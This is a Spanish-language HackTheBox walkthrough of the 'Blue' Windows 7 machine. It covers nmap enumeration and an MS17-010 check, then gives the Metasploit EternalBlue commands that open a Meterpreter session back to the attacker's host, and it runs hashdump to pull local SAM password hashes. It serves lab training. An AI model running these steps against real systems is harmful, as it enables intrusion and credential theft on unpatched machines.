BLUE

HackTheBox | 16 ago 2026 | Dificultad: Fácil

Introducción

Blue es una máquina Windows de dificultad fácil de HackTheBox. Durante la resolución realizaremos una enumeración de los servicios expuestos para identificar un servicio SMB vulnerable.

La máquina ejecuta Windows 7 Professional SP1 y tiene SMBv1 disponible. Mediante la vulnerabilidad MS17-010, conocida como EternalBlue, conseguiremos una sesión Meterpreter con privilegios NT AUTHORITY\SYSTEM.

1. Reconocimiento

Comenzamos realizando un escaneo de puertos para identificar los servicios expuestos en la máquina. 

nmap -Pn -p- --min-rate 5000 -vvv -oG allports <IP>

El escaneo muestra los siguientes puertos abiertos:

  • 135/tcp → MSRPC
  • 139/tcp → NetBIOS-SSN
  • 445/tcp → Microsoft-DS / SMB

2. Enumeración de servicios

Una vez identificados los puertos abiertos, realizamos un segundo escaneo más específico utilizando scripts de enumeración y detección de versiones. 

nmap -p135,139,445 -sCV <IP> -oG targeted

Nmap identifica el sistema como Microsoft Windows 7 Professional 7601 Service Pack 1, perteneciente al grupo de trabajo WORKGROUP.

Al estar SMB expuesto sobre el puerto 445 y tratarse de una versión antigua de Windows, comprobamos si el servicio es vulnerable a MS17-010.

3. Enumeración SMB

Antes de explotar la vulnerabilidad, enumeramos SMB para confirmar los protocolos disponibles y obtener información adicional del sistema. 

nmap -p445 --script smb-os-discovery,smb-protocols <IP>

La enumeración confirma la presencia de SMBv1. Esta versión del protocolo es relevante porque MS17-010 afecta a implementaciones de SMBv1 que no han recibido el parche de seguridad correspondiente.

4. Comprobación de MS17-010

Nmap dispone de un script específico para comprobar la vulnerabilidad MS17-010. De esta forma verificamos el vector de ataque antes de intentar la explotación. 

nmap -p445 --script smb-vuln-ms17-010 <IP>

El resultado indica que el objetivo es VULNERABLE a la vulnerabilidad de ejecución remota de código en SMBv1.

5. Explotación con EternalBlue

Con la vulnerabilidad confirmada, utilizamos el módulo de Metasploit correspondiente a EternalBlue. 

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <TU_IP>
run

Tras ejecutar el módulo, se establece una sesión Meterpreter contra la máquina objetivo.

6. Obtención de privilegios SYSTEM

Comprobamos el usuario de la sesión obtenida mediante el comando getuid: 

meterpreter > getuid

El resultado confirma que la sesión se ejecuta como NT AUTHORITY\SYSTEM. Por tanto, la explotación nos proporciona directamente los máximos privilegios del sistema. 

meterpreter > sysinfo

7. Extracción de hashes

Al disponer de privilegios SYSTEM podemos extraer los hashes de las cuentas locales almacenadas en la base SAM. 

meterpreter > hashdump

El comando devuelve los hashes de las cuentas locales. Esto demuestra el impacto completo de la vulnerabilidad, ya que permite ejecutar código de forma remota con privilegios administrativos.

8. Conclusión

Blue comienza con la enumeración de los servicios expuestos, donde encontramos SMB disponible en los puertos 139 y 445.

La detección de Windows 7 Professional SP1 y SMBv1 nos lleva a comprobar MS17-010. El script de Nmap confirma la vulnerabilidad y permite utilizar EternalBlue para obtener acceso inicial.

Finalmente, el módulo de Metasploit obtiene una sesión Meterpreter como NT AUTHORITY\SYSTEM, desde la que es posible extraer los hashes de las cuentas locales con hashdump.

BLUE completada.
